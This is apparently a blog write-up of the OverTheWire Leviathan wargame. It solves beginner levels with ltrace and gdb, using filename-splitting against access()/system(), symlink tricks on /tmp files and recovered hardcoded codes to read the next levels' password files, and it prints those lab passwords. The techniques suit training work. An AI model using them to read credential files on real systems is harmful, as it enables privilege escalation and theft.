---
layout: single
title: "OverTheWire - Leviathan"
show_excerpt: false
toc: true
toc_sticky: true
toc_label: "Levels"
date: 2024-04-09
classes: single
header:
  teaser: /assets/images/avatarpng.png
  teaser_home_page: true
  icon: /assets/images/avatarpng.png
related: true
categories:
  - CTF
tags:
  - Binary Exploitation
  - C
---

**Leviathan** wargame

```ruby
Summary:just a bit of common sense and some knowledge about basic *nix commands.
Difficulty:     1/10
Levels:         8
Platform:   Linux/x86
passwords: Passwords are at /etc/leviathan_pass/
```

ssh leviathanX@leviathan.labs.overthewire.org -p 2223

### Level 1

The program reads 3 chars from the user and stores it in \[ebp - 0x24\]

![[/assets/images/Leviathan/Screenshot 2024-03-27 at 0.32.10.png]]

This is how it looks in memory
![[Pasted image 20240327003106.png]]
This is what it translates to:
![[Pasted image 20240327003542.png]]

Tried entering the password sex and it worked!
![[Pasted image 20240327004150.png]]

### Level 2

![[Pasted image 20240327201429.png]]Looks like we don't permission to read the file. lets use ltrace to see all fucntion calls.

Let's use [[ltrace]]  - a library call tracer to see all called libraries of the program printfile. 
```bash
ltrace ./printfile /tmp/rwxbeny/flag

__libc_start_main(0x80491e6, 2, 0xffffd684, 0 <unfinished ...>

access("/tmp/rwxbeny/flag", 4)                   = -1

puts("You cant have that file..."You cant have that file...

)               = 27

+++ exited (status 1) +++
```

With ltrace we can see that the program calls the access function with our given parameter.
let's see how access works.

```C
access()  checks  whether the calling process can access the file path‐name.  If pathname is a symbolic link, it is dereferenced.
```

Great. let's give it a valid path to see the flow of library calls

```C
leviathan2@gibson:~$ ltrace ./printfile /tmp/rwxbeny/test 
__libc_start_main(0x80491e6, 2, 0xffffd674, 0 <unfinished ...>
access("/tmp/rwxbeny/test", 4)                   = 0
snprintf("/bin/cat /tmp/rwxbeny/test", 511, "/bin/cat %s", "/tmp/rwxbeny/test") = 26
geteuid()                                        = 12002
geteuid()                                        = 12002
setreuid(12002, 12002)                           = 0
system("/bin/cat /tmp/rwxbeny/test"Hello!

 <no return ...>

--- SIGCHLD (Child exited) ---

<... system resumed> )                           = 0

+++ exited (status 0) +++
```

We see that once given a file with the right permissions, the program then continues to set the effective uid to 12002 and call /bin/cat to read the given file.

okay, lets try to give 'access()' a path with a file name that has a space in between. This could cause a malfunction which on the one hand access() will have the permission to open the file (Since we created the file), and on the other hand the file name will be constructed from the name of the flag file.

```ruby
mkdir /tmp/rwxbeny
cd /tmp/rwxbeny
ln -s /etc/leviathan_pass/leviathan3 flag
echo 123 >> "flag me"
```

Now let's see what happens with ltrace:
```ruby
leviathan2@gibson:~$ ltrace ./printfile /tmp/rwxbeny/flag\ me
__libc_start_main(0x80491e6, 2, 0xffffd674, 0 <unfinished ...>
access("/tmp/rwxbeny/flag me", 4)                = 0
snprintf("/bin/cat /tmp/rwxbeny/flag me", 511, "/bin/cat %s", "/tmp/rwxbeny/flag me") = 29
geteuid()                                        = 12002
geteuid()                                        = 12002
setreuid(12002, 12002)                           = 0
system("/bin/cat /tmp/rwxbeny/flag me"/bin/cat: /tmp/rwxbeny/flag: Permission denied
/bin/cat: me: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                           = 256
+++ exited (status 0) +++
```

Great! this works! Now if we call the program without ltrace we should get the flag
```ruby
leviathan2@gibson:~$ ./printfile /tmp/rwxbeny/flag\ me
Q0G8j4sakn
/bin/cat: me: No such file or directory
leviathan2@gibson:~$
```

### Level 3

In this challenge we are presented with a program 'level3' in the home directory.
Using [[ltrace]] we see that first function call is strcmp() which compares two unrelated strings.
```ruby
leviathan3@gibson:~$ ltrace ./level3 
__libc_start_main(0x80492bf, 1, 0xffffd6a4, 0 <unfinished ...>
strcmp("h0no33", "kakaka")                       = -1
printf("Enter the password> ")                   = 20
fgets(Enter the password> password
"password\n", 256, 0xf7e2a620)             = 0xffffd47c
strcmp("password\n", "snlprintf\n")              = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                       = 19
+++ exited (status 0) +++
**leviathan3@gibson**:**~**$
```

Then, after giving it a password, we see another strcmp() call. So let's try this time to give the program the wanted string

```ruby
**leviathan3@gibson**:**~**$ ltrace ./level3 
__libc_start_main(0x80492bf, 1, 0xffffd6a4, 0 <unfinished ...>
strcmp("h0no33", "kakaka")                       = -1
printf("Enter the password> ")                   = 20
fgets(Enter the password> snlprintf
"snlprintf\n", 256, 0xf7e2a620)            = 0xffffd47c
strcmp("snlprintf\n", "snlprintf\n")             = 0
puts("[You've got shell]!"[You've got shell]!
)                      = 20
geteuid()                                        = 12003
geteuid()                                        = 12003
setreuid(12003, 12003)                           = 0
system("/bin/sh"$
```
Great! we see the upon giving the correct string, we get our privileges elevated to user 12003. This is okay since we run the program with ltrace.
Let's run the program without ltrace to see the real output:
```ruby
leviathan3@gibson:~$ ./level3 
Enter the password> snlprintf
[Youve got shell]!
$ whoami
leviathan4
$ cat /etc/leviathan_pass/leviathan4
AgvropI4OA
$
```

### Level 4




### Level 5

Using ltrace we see that the program uses open() to open the file /tmp/file.log
```ruby
leviathan5@gibson:~$ ltrace ./leviathan5 
__libc_start_main(0x8049206, 1, 0xffffd694, 0 <unfinished ...>
fopen("/tmp/file.log", "r")                      = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)                = 26
exit(-1 <no return ...>
+++ exited (status 255) +++
```

The operation is unsuccessful, but since tmp is a folder we have write permissions to, we can easily create the matched file.

```ruby
leviathan5@gibson:~$ echo "hey" > /tmp/file.log
leviathan5@gibson:~$ ltrace ./leviathan5 
__libc_start_main(0x8049206, 1, 0xffffd694, 0 <unfinished ...>
fopen("/tmp/file.log", "r")                      = 0x804d1a0
fgetc(0x804d1a0)                                 = 'h'
feof(0x804d1a0)                                  = 0
putchar(104, 0x804a008, 0xf7c184be, 0xf7fbe4a0)  = 104
fgetc(0x804d1a0)                                 = 'e'
feof(0x804d1a0)                                  = 0
putchar(101, 0x804a008, 0xf7c184be, 0xf7fbe4a0)  = 101
fgetc(0x804d1a0)                                 = 'y'
feof(0x804d1a0)                                  = 0
putchar(121, 0x804a008, 0xf7c184be, 0xf7fbe4a0)  = 121
fgetc(0x804d1a0)                                 = '\n'
feof(0x804d1a0)                                  = 0
putchar(10, 0x804a008, 0xf7c184be, 0xf7fbe4a0hey
)   = 10
fgetc(0x804d1a0)                                 = '\377'
feof(0x804d1a0)                                  = 1
fclose(0x804d1a0)                                = 0
getuid()                                         = 12005
setuid(12005)                                    = 0
unlink("/tmp/file.log")                          = 0
+++ exited (status 0) +++
```

After creating the file, we can see that the program continues to read chars one by one, and then outputs it to the screen. Thats good for us! since the program runs with Leviathan6 permissions.

Let's try to make a symbolic link between the password for the next level with the opened file.
```ruby
leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@gibson:~$ ./leviathan5 
YZ55XPVk2l
```

### Level 6

running ls -la gives us one file to work with - leviathan6. We have permission to run it, so let's do so.
```ruby
leviathan6@gibson:~$ ls -la
total 36
drwxr-xr-x  2 root       root        4096 Oct  5 06:19 .
drwxr-xr-x 83 root       root        4096 Oct  5 06:20 ..
-rw-r--r--  1 root       root         220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root        3771 Jan  6  2022 .bashrc
-r-sr-x---  1 leviathan7 leviathan6 15024 Oct  5 06:19 leviathan6
-rw-r--r--  1 root       root         807 Jan  6  2022 .profile
```

The program asks for a 4 digit code as an argument
```ruby
leviathan6@gibson:~$ ./leviathan6 
usage: ./leviathan6 <4 digit code>
```

let's fire up gdb and see what are the 4 digits it needs!

```ruby
(gdb) disas main 
<code snipped>
0x0804921e <+72>: sub    esp,0xc
0x08049221 <+75>: push   eax
0x08049222 <+76>: call   0x80490b0 <atoi@plt>
0x08049227 <+81>: add    esp,0x10
0x0804922a <+84>: cmp    DWORD PTR [ebp-0xc],eax
0x0804922d <+87>: jne    0x804925a <main+132>
0x0804922f <+89>: call   0x8049060 <geteuid@plt>
0x08049234 <+94>: mov    ebx,eax
0x08049236 <+96>: call   0x8049060 <geteuid@plt>
<code snipped>
```
As we can see, EAX register is being compared to a value in memory at \[ebp-0xc\] location. lets see what it is.

```ruby
(gdb) break *main+84
Breakpoint 1 at 0x804922a
(gdb) run 1234
Starting program: /home/leviathan6/leviathan6 1234
<code snipped>

Breakpoint 1, 0x0804922a in main ()
(gdb) i r ebp
ebp            0xffffd588          0xffffd588

(gdb) x/4xb 0xffffd588-0xc
0xffffd57c: 0xd3 0x1b 0x00 0x00
```

Examining the memory gives us 0xd3 0x1b. Since the architecture is little endian, when a register reads from memory, it reads the bytes from the bigger offset to the smaller offset. 
That means that EAX is being compared to 0x1bd3 which is hexadecimal for 7123.
Great! this is our wanted number.

```ruby
./leviathan6 7123
$ cat /etc/leviathan_pass/leviathan7
8GpZ5f8Hze
```

### Level 7
```ruby
leviathan7@gibson:~$ cat CONGRATULATIONS 

Well Done, you seem to have used a *nix system before, now try something more serious.

(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)
```

### Conclusion
This is a great wargame for starters. I learned a lot about unix, and practiced my knowledge. [[ltrace]] was my friend throughout this challenge.

I recommend it!